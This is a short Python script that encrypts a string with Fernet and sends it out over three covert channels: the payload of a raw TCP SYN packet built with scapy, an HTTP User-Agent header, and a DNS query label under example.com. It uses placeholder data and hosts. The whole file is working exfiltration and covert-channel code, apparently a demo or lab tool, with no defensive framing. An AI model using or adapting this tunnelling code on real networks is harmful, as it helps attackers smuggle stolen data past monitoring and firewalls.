import base64
from cryptography.fernet import Fernet
import scapy.all as scapy
import requests
import dns.resolver
import os

# Function to generate/load a Fernet key
def get_key():
    key_path = "secret.key"
    if os.path.exists(key_path):
        with open(key_path, "rb") as key_file:
            key = key_file.read()
            print("Loaded Fernet Key.")
    else:
        key = Fernet.generate_key()
        with open(key_path, "wb") as key_file:
            key_file.write(key)
            print("Generated and saved Fernet Key.")
    return key

# Encrypt data
def encrypt_data(data, key):
    cipher = Fernet(key)
    encrypted_data = cipher.encrypt(data.encode())
    return encrypted_data

# Embed data into TCP packets
def embed_in_tcp(data):
    ip = scapy.IP(dst="192.168.1.1")  # Set destination IP to test machine
    tcp = scapy.TCP(dport=80, sport=12345, flags="S")
    packet = ip / tcp / data
    scapy.send(packet, verbose=False)
    print("Data embedded in TCP packet.")

# Embed data into HTTP headers
def embed_in_http(data):
    url = "http://example.com"  # Example HTTP request
    headers = {"User-Agent": data}
    response = requests.get(url, headers=headers)
    print("Data embedded in HTTP header.")

# Embed data into DNS queries with limited label length
def embed_in_dns(data):
    resolver = dns.resolver.Resolver()
    max_label_length = 63  # Max length for a DNS label

    # Truncate data if it's too long for one label
    truncated_data = data[:max_label_length]
    try:
        query = resolver.query(f"{truncated_data}.example.com", "A")
        print("Data embedded in DNS query.")
    except dns.resolver.NXDOMAIN:
        print("DNS query error: Domain does not exist.")
    except Exception as e:
        print(f"Error embedding data in DNS query: {e}")


# Main function to start embedding process
def start_embedding():
    key = get_key()
    data_to_hide = "asd"
    encrypted_data = encrypt_data(data_to_hide, key)
    print("Encrypted Data:", encrypted_data.decode())

    embed_in_tcp(encrypted_data.decode())
    embed_in_http(encrypted_data.decode())
    embed_in_dns(encrypted_data.decode())

    print("Embedding complete.")

if __name__ == "__main__":
    start_embedding()